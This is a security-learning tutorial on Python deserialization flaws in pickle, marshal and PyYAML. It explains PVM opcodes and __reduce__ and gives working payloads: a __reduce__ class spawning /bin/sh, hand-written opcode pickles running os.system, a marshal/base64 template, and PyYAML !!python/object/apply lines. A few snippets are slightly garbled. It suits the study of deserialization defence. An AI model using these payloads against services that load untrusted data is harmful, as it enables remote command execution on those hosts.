# Python Security Learningâ€”Python Deserialization Vulnerability

Author: H3rmesk1t

Data: 2022.03.24

# Introduction
The serialization and deserialization of `Python` is a process of converting a class object into a byte stream for storage and transmission, and then converting the byte stream back to the original object when used. This is actually similar to the serialization and deserialization of other languages.

There are generally two ways to serialize in `Python`: the `pickle` module and the `json` module. The former is a unique format for `Python`, and the latter is a common format for `json`.

Compared with `PHP` deserialization, flexible and diverse methods of using `POP` chain construction, `Phar` deserialization, native class deserialization and character escape, etc. `Python` is relatively not as flexible as `PHP`. The deserialization vulnerability mainly involves several concepts: `pickle`, `pvm`, `__reduce__` magic method. This article mainly takes a look at the deserialization vulnerability problem of `pickle` module.

# Pickle
## Introduction
`Pickle` can be used to convert between `Python`'s unique type and `Python` data types (all `Python` data types).

`Python` provides two modules to implement serialization: `cPickle` and `pickle`. The functions of these two modules are the same. The difference is that `cPickle` is written in the C` language and is fast; `pickle` is written in pure Python` and is slow. There is no `cPickle` module in `Python3`. There are four operating methods for `pickle`:

|Function|Description|
|:----|:----|
|dump| Object deserializes to file objects and saves them into files|
|dumps| Object deserializes to bytes object|
|load| Object deserializes and reads data from a file|
|loads| Deserialize from bytes object|

## Simple use
### Serialization operation
 - Code
```python
import pickle

class Demo():
    def __init__(self, name='h3rmesk1t'):
        self.name = name

print(pickle.dumps(Demo()))
```

 - Python3

```python
b'\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94}\x94\x8c\x04name\x94\x8c\th3rmesk1t\x94sb.'
```

 - Python2

```python
(i__main__
Demo
p0
(dp1
S'name'
p2
S'h3rmesk1t'
p3
sb.
```

The output string of characters is actually a string of `PVM` opcodes. You can see a detailed explanation of these opcodes in `pickle.py`.

<div align=center><img src="./images/1.png"></div>

### Deserialization operation

```python
import pickle

class Demo():
    def __init__(self, name='h3rmesk1t'):
        self.name = name

print('[+] serialization')
print(pickle.dumps(Demo()))
print('[+] deserialization')
print(pickle.loads(pickle.dumps(Demo())).name)
```

<div align=center><img src="./images/2.png"></div>

## PVM
### Components
`PVM` consists of three parts:
 - Instruction processor: Read `opcode` and parameters from the stream and interpret them. Repeat this action until the ending character of `.` is encountered, and the value that is finally left at the top of the stack will be returned as a deserialized object.
 - Stack area (`stack`): Implemented by `Python`'s `list`, it is used to temporarily store data, parameters and objects, complete the deserialization operation of the data stream during continuous in-and-out of the stack, and finally generate the deserialization result at the top of the stack.
 - Tag area (`memo`): Implemented by `dict` of `python`, providing storage for the entire life cycle of `PVM`.

### Execution process
First, `PVM` will compile the source code into bytecode. Bytecode is a unique manifestation of the `Python` language. It is not binary machine code and needs further compilation to be executed by the machine. If the `Python` process has write permission on the host, it will save the program bytecode as a file with the extension `.pyc`. If there is no write permission, the `Python` process will generate bytecode in memory and will be automatically discarded after the program execution is completed.

Generally speaking, it is best to give the Python process write permission on the host when building the program, so that as long as the source code has not changed, the generated `.pyc` file can be reused to improve execution efficiency and hide the source code.

Then, the `Python` process forwards the compiled bytecode to `PVM` (`Python` virtual machine), which `PVM` will loop and execute bytecode instructions until all operations are completed.

### Instruction Set
There are currently 6 types of protocols used for `pickling`. The higher the protocol version used, the newer the Python version required to read the generated `pickle`.
 - The `v0` version protocol is the original "human-readable" protocol and is backward compatible with earlier versions of `Python`.
 - The `v1` version protocol is an earlier binary format, and it is also compatible with earlier versions of `Python`.
 - The `v2` version protocol was introduced in `Python 2.3`, which provides a more efficient mechanism for storing `new-style class`, see `PEP 307`.
 - The `v3` version protocol was added to `Python 3.0`, which has explicit support for `bytes` objects and cannot be opened by `Python 2.x`. This is the protocol currently used by default and is also a recommended protocol when requiring compatibility with other `Python 3` versions.
 - The `v4` version of the protocol was added to `Python 3.4`, which supports storing very large objects and can store more types of objects. It also includes some optimizations for data formats, see `PEP 3154`.
 - The `v5` version protocol was added to `Python 3.8`, which supports out-of-band data and accelerates in-band data processing.


```python
# Pickle opcodes. See pickletools.py for extended docs. The listing
# here is in kind-of alphabetical order of 1-character pickle code.
# pickletools groups them by purpose.

MARK = b'(' # push special markobject on stack
STOP = b'.' # every pickle ends with STOP
POP = b'0' # discard topmost stack item
POP_MARK = b'1' # discard stack top through topmost markobject
DUP = b'2' # duplicate top stack item
FLOAT = b'F' # push float object; decimal string argument
INT = b'I' # push integer or bool; decimal string argument
BININT = b'J' # push four-byte signed int
BININT1 = b'K' # push 1-byte unsigned int
LONG = b'L' # push long; decimal string argument
BININT2 = b'M' # push 2-byte unsigned int
NONE = b'N' # push None
PERSID = b'P' # push persistent object; id is taken from string arg
BINPERSID = b'Q' # " " " " ; " " " " " " " stack
REDUCE = b'R' # apply callable to argtuple, both on stack
STRING = b'S' # push string; NL-terminated string argument
BINSTRING = b'T' # push string; counted binary string argument
SHORT_BINSTRING= b'U' # " " ; " " " " " < 256 bytes
UNICODE = b'V'
# push Unicode string; raw-unicode-escaped'd argument
BINUNICODE = b'X' # " " " ; counted UTF-8 string argument
APPEND = b'a' # append stack top to list below it
BUILD = b'b' # call __setstate__ or __dict__.update()
GLOBAL = b'c' # push self.find_class(modname, name); 2 string args
DICT = b'd' # build a dict from stack items
EMPTY_DICT = b'}' # push empty dict
APPENDS = b'e' # extend list on stack by topmost stack slice
GET = b'g' # push item from memo on stack; index is string arg
BINGET = b'h' # " " " " " " " " " " " " ; " " 1-byte arg
INST = b'i' # build & push class instance
LONG_BINGET = b'j' # push item from memo on stack; index is 4-byte arg
LIST = b'l' # build list from topmost stack items
EMPTY_LIST = b']' # push empty list
OBJ = b'o' # build & push class instance
PUT = b'p' # store stack top in memo; index is string arg
BINPUT = b'q' # " " " " " " " " " ; " " 1-byte arg
LONG_BINPUT = b'r' # " " " " " " " " ; " " 4-byte arg
SETITEM = b's' # add key+value pair to dict
TUPLE = b't' # build tuple from topmost stack items
EMPTY_TUPLE = b')' # push empty tuple
SETITEMS = b'u' # modify dict by adding topmost key+value pairs
BINFLOAT = b'G' # push float; arg is 8-byte float encoding

TRUE = b'I01\n' # not an opcode; see INT docs in pickletools.py
FALSE = b'I00\n' # not an opcode; see INT docs in pickletools.py

# Protocol 2

PROTO = b'\x80' # identify pickle protocol
NEWOBJ = b'\x81' # build object by applying cls.__new__ to argtuple
EXT1 = b'\x82' # push object from extension registry; 1-byte index
EXT2 = b'\x83' # ditto, but 2-byte index
EXT4 = b'\x84' # ditto, but 4-byte index
TUPLE1 = b'\x85' # build 1-tuple from stack top
TUPLE2 = b'\x86' # build 2-tuple from two topmost stack items
TUPLE3 = b'\x87' # build 3-tuple from three topmost stack items
NEWTRUE = b'\x88' # push True
NEWFALSE = b'\x89' # push False
LONG1 = b'\x8a' # push long from < 256 bytes
LONG4 = b'\x8b' # push really big long

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

# Protocol 3 (Python 3.x)

BINBYTES = b'B' # push bytes; counted binary string argument
SHORT_BINBYTES = b'C' # " " ; " " " " " < 256 bytes

#Protocol 4

SHORT_BINUNICODE = b'\x8c' # push short string; UTF-8 length < 256 bytes
BINUNICODE8 = b'\x8d' # push very long string
BINBYTES8 = b'\x8e' # push very long bytes string
EMPTY_SET = b'\x8f' # push empty set on the stack
ADDITEMS = b'\x90' # modify set by adding topmost stack items
FROZENSET = b'\x91' # build frozenset from topmost stack items
NEWOBJ_EX = b'\x92' # like NEWOBJ but work with keyword only arguments
STACK_GLOBAL = b'\x93' # same as GLOBAL but using names on the stacks
MEMOIZE = b'\x94' # store top of the stack in memo
FRAME = b'\x95' # indicate the beginning of a new frame

#Protocol 5

BYTEARRAY8 = b'\x96' # push bytearray
NEXT_BUFFER = b'\x97' # push next out-of-band buffer
READONLY_BUFFER = b'\x98' # make top of stack readonly
```

As mentioned above, there are multiple versions of `opcode`. When serializing, you can select the version of `opcode` by `protocol=num`. The specified version must be less than or equal to `5`.

```python
import os
import pickle

class Demo():
    def __init__(self, name='h3rmesk1t'):
        self.name = name
    
    def __reduce__(self):
        return (os.system, ('whoami',))


demo = Demo()
for i in range(6):
    print('[+] pickle v{}: {}'.format(str(i), pickle.dumps(demo, protocol=i)))
```

```python
[+] pickle v0: b'cposix\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
[+] pickle v1: b'cposix\nq\x00(X\x06\x00\x00\x00whoamiq\x01tq\x02Rq\x03.'
[+] pickle v2: b'\x80\x02cposix\nq\x00X\x06
\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
[+] pickle v3: b'\x80\x03cposix\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
[+] pickle v4: b'\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
[+] pickle v5: b'\x80\x05\x95!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
```

<div align=center><img src="./images/3.png"></div>

Basic mode:

```python
c<module>
<callable>
(<args>
tR.
```

Here is a short bytecode to demonstrate the utilization process:

```python
cos
system
(S'whoami'
tR.
```

<div align=center><img src="./images/4.png"></div>

The bytecode above is actually `__import__('os').system(*('whoami',))`. Let's decompose and analyze it below:

```bash
cos => Introduce module os.
system => Refer to the system and add it to the stack.
(S'whoami' => Save the current stack to metastack, clear the stack, and then press 'whoami' into the stack.
t => The value in stack pops up and turns into tuple, restore metastack to stack, and then press tuple into stack.
R => system(*('whoami',)).
. => End and return the current top element.
```

It should be noted that not all objects can be serialized and deserialized using `pickle`, such as file objects, network socket objects, and code objects.

# Deserialization vulnerability
## Common places for vulnerabilities
 1. Usually when parsing the authentication `token` and `session`. Now many `Web services use `redis`, `mongodb`, `memcached`, etc. to store `session` and other status information.

 2. The object `Pickle` may be stored as a disk file.

 3. The object `Pickle` may be transmitted on the network.

## Vulnerability Exploit Methods
The reason for the vulnerability is that it can serialize and deserialize custom classes. The object generated after deserialization will trigger the `__reduce__()` function at the end, thereby triggering malicious code.

<div align=center><img src="./images/5.png"></div>

Simply put, the `__reduce__()` magic method is similar to the `__wakeup()` method in PHP. The `__reduce__()` magic method will be called first when deserializing.
 1. If the return value is a string, the object with the corresponding name in the current scope will be searched for, and then serialize it and return it.
 2. If the return value is a tuple, the Requirements are `2` to `6` parameters (the sixth item added to the tuple in Python3.8`).
    1. The first parameter is a callable object.
    2. The second is the parameter tuple required by the object. If the callable object does not accept parameters, an empty tuple must be provided.
    3. The third is an optional element used to represent the state of the object, which will be passed to the aforementioned `__setstate__()` method. If the object does not have this method, this element must be of a dictionary type and will be added to the `__dict__` property.
    4. The fourth is an optional element of the iterator used to return consecutive terms.
    5. The fifth is an optional element of the iterator that returns consecutive key-value pairs.
    6. The sixth is an optional element of a callable object with an `(obj, state)` signature.

## Basic Payload

```python
import os
import pickle

class Demo(object):
    def __reduce__(self):
        shell = '/bin/sh'
        return (os.system,(shell,))

demo = Demo()
pickle.loads(pickle.dumps(demo))
```

<div align=center><img src="./images/6.png"></div>

# Marshal Deserialization
Since `pickle` cannot serialize the `code` object, a `marshal` module was added after `python2.6` to handle the serialization problem of `code` objects.

```pyhon
import base64
import marshal

def demo():
    import os
    os.system('/bin/sh')

code_serialized = base64.b64encode(marshal.dumps(demo()))
print(code_serialized)
```

<div align=center><img src="./images/7.png"></div>

However, marshal cannot use `__reduce__` directly, because `reduce` is executed by calling a `callable` and passing parameters. The `marshal` function itself is a `callable` and needs to be executed instead of using it as a parameter of a function.

At this time, we need to use the `PVM` opcode analyzed above to construct it. First write out the content that needs to be executed. `Python` can dynamically create anonymous functions through `types.FunctionTyle(func_code,globals(),'')()`. The content of this part can be described in the [official document] (https://docs.python.org/3/library/types.html).

Combining the above example code, the most important thing to execute is: `(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))()`.

Here I will directly post the `Payload` template given by other masters.

```python
import base64
import pickle
import marshal

def foo():
    import os
    os.system('whoami;/bin/sh') # evil code

shell = """ctypes
FunctionType
(cmmarshal)
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
Globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

print(pickle.loads(shell))
```

<div align=center><img src="./images/8.png"></div>

# PyYAML Deserialization
## Vulnerability Points
Find the `yaml/constructor.py` file and view the source code of the three special `Python` tags in the file code:
 - `!!python/object` tag.
 - `!!python/object/new` tag.
 - `!!python/object/apply` tag.

<div align=center><img src="./images/9.png"></div>

All of these three `Python` tags call the `make_python_instance` function, follow up and view the function. You can see that the function will dynamically create a new `Python` class object according to the parameters or create an object by referring to the `module` class, so that any command can be executed.



<div align=center><img src="./images/10.png"></div>

## Payload(PyYaml < 5.1)

```yaml
!!python/object/apply:os.system ["calc.exe"]
!!python/object/new:os.system ["calc.exe"]
!!python/object/new:subprocess.check_output [["calc.exe"]]
!!python/object/apply:subprocess.check_output [["calc.exe"]]
```

## Pyload(PyYaml >= 5.1)

```python
from yaml import *
data = b"""!!python/object/apply:subprocess.Popen
 - calc"""
deserialized_data = l
oad(data, Loader=Loader)
print(deserialized_data)
```

```python
from yaml import *
data = b"""!!python/object/apply:subprocess.Popen
- calc"""
deserialized_data = unsafe_load(data)
print(deserialized_data)
```

# Defense Method
 - Use the magic method of using more advanced interfaces `__getnewargs()`, `__getstate__()`, `__setstate__()`, etc. instead of `__reduce__()`.
 - Strict filtering is performed before deserialization operation. If you use the `pickle` library, you can use a decorator to implement it.

# refer to
 - [A post will help you understand the Python deserialization vulnerability](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)